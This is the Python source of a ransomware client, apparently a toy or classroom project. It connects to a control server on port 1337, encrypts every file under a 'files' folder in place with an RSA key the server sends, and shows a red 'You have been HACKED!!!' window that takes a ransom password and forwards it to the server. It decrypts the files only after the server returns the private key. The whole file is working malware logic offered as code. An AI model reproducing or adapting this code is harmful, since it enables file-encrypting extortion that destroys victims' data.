from Crypto.PublicKey import RSA
import socket
import keys
import os
import tkinter as tk
import threading
import select
import queue
import sys
from PIL import Image, ImageTk

HOST = '127.0.0.1'
PORT = 1337

FIRST_RUN = True

ENCRYPT_MESSAGE = 0
WRONG_PASSWORD_MESSAGE = 1
DECRYPT_MESSAGE = 2

shared_queue = queue.Queue()

def encrypt(key, input_file):
    encrypted_data = b''
    while True:
        data = input_file.read(64)
        if not data:
            break
        block = keys.encrypt(key, data)
        encrypted_data += block + b'\n'
    return encrypted_data


def decrypt(key, input_file):
    data = input_file.read()
    data = data.split(b'\n')
    input_file.close()
    
    decrypted_data = b''
    for row in data:
        if not row:
            break
        decrypted_data += keys.decrypt(key, row)
    return decrypted_data

def gui():
    window = tk.Tk()

    canvas = tk.Canvas(window, width=64, bg="red", height=80)      
    canvas.pack()      
    img = tk.PhotoImage(file="lock.png")   

    canvas.create_image(0, 10, anchor=tk.NW, image=img) 
    label_pass = tk.Label(master=window, bg="red", text="You have been HACKED!!!")
    label_pass.pack()

    label_pass = tk.Label(master=window, bg="red", text="Password:")
    label_pass.pack()
    ent_pass = tk.Entry(master=window, width=50)
    ent_pass.pack()

    def check():
        print('txt:', ent_pass.get())
        shared_queue.put(ent_pass.get())
        ent_pass.delete(0, tk.END)

    btn_submit = tk.Button(master=window, text="Submit", command=check)
    btn_submit.pack(side=tk.RIGHT, padx=10, ipadx=10)

    window.configure(background='red', highlightbackground="red")
    window.winfo_toplevel().title('MY RANSOMWARE')
    window.geometry("600x200")
    window.mainloop()

def connection(server_socket):
    inputs = [server_socket] # read
    outputs = [server_socket] # write

    if FIRST_RUN:
        server_socket.sendall(bytes([0]))

    while inputs:        
        readable, writable, _ = select.select(inputs, outputs, [])

        for conn in readable:
            msg = conn.recv(4096)
            msg_type = int(msg[0])
            
            if msg_type == ENCRYPT_MESSAGE:
                public_key = RSA.importKey(msg[1:])

                for root, _, files in os.walk('files'):
                    for filename in files:
                        print('ENCRYPT FILE:', filename)
                        
                        input_file = open(root + "/" + filename, 'rb')
                        data = encrypt(public_key, input_file)
                        input_file.close()

                        output_file = open(root + "/" + filename, 'wb')
                        output_file.write(data)
                        output_file.close()
            elif msg_type == WRONG_PASSWORD_MESSAGE:
                print('wrong password')
            elif msg_type == DECRYPT_MESSAGE:
                private_key = RSA.importKey(msg[1:])
                
                for root, _, files in os.walk('files'):
                    for filename in files:
                        print('DECRYPT FILE:', filename)
                        
                        input_file = open(root + "/" + filename, 'rb')
                        data = decrypt(private_key, input_file)
                        input_file.close()

                        output_file = open(root + "/" + filename, 'wb')
                        output_file.write(data)
                        output_file.close()
                os._exit(0)                    

        for conn in writable:
            try:
                password = shared_queue.get_nowait()
            except queue.Empty:
                pass
            else:  
                conn.sendall(bytes([1]) + password.encode('utf-8'))

if __name__ == '__main__':
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    my_socket.connect((HOST, PORT))

    gui_thread = threading.Thread(target=gui, args=())
    connection_thread = threading.Thread(target=connection, args=(my_socket,))

    gui_thread.start()
    connection_thread.start()